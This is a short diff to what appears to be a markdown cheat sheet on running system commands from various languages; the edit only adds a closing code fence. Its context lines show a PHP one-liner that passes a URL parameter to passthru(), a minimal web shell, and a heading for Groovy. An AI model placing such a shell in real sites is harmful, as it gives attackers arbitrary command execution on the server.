@@ -20,7 +20,7 @@ PHP is widely used and can often have the system(), exec(), etc functions eenabl
 <?php
  passthru($_GET['cmd']); # displays right to the DOM
  ?>
-
+```
 ## Groovy
 Groovy/Java can execute commands and print the output like so,
 ```
